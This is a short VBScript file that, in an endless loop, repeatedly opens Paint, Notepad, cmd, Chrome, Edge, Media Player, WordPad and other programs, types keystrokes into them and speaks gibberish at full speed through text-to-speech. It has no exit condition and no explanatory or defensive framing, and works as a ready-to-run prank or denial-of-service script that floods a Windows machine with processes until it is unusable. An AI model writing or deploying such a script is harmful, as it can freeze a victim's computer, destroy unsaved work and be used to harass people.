Option Explicit

'----------------------------------------------------------------------------variables 
Dim objVOC : Set objVOC = CreateObject("SAPI.SpVoice")
Dim WshShell
'----------------------------------------------------------------------------open notepad
do
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "mspaint.exe", 9
WshShell.Run "notepad.exe", 9
WshShell.Run "cmd.exe", 9
WshShell.Run "chrome.exe", 9
WshShell.Run "msedge.exe", 9
WshShell.Run "wmplayer.exe", 9
WshShell.Run "wab.exe", 9
WshShell.Run "wabmig.exe", 9
WshShell.Run "wordpad.exe", 9
WshShell.Run "mspaint.exe", 9
WshShell.Run "notepad.exe", 9
WshShell.Run "cmd.exe", 9
WshShell.Run "chrome.exe", 9
WshShell.Run "msedge.exe", 9
WshShell.Run "wmplayer.exe", 9
WshShell.Run "wab.exe", 9
WshShell.Run "wabmig.exe", 9
WshShell.Run "wordpad.exe", 9
WshShell.Run "mspaint.exe", 9
WshShell.Run "notepad.exe", 9
WshShell.Run "cmd.exe", 9
WshShell.Run "chrome.exe", 9
WshShell.Run "msedge.exe", 9
WshShell.Run "wmplayer.exe", 9
WshShell.Run "wab.exe", 9
WshShell.Run "wabmig.exe", 9
WshShell.Run "wordpad.exe", 9
'----------------------------------------------TYPE
 WshShell.SendKeys "eeb"
'----------------------------------------------------------------------------SPEAK
objVOC.Rate = 100
objVOC.Speak "eeeieeieiooaaaua uaeuuueeoeoeoei uaaaeoeoiaiauuaa"
loop
